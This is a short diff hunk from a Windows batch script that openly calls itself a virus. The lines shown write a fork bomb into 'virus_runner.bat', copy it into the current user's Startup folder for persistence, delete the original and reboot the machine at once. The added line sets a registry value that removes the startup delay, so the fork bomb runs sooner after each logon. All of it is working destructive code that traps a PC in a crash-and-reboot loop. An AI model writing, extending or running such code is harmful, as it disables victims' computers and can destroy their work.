@@ -28,4 +28,5 @@ del xwkqelajcmLsldi.bat >nul
 echo %%0^|%%0 ^>nul > virus_runner.bat && cls
 copy virus_runner.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" && cls
 del virus_runner.bat&&cls
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize" /v StartupDelayInMSec /t REG_DWORD /d 0 /f
 shutdown /r /t 0
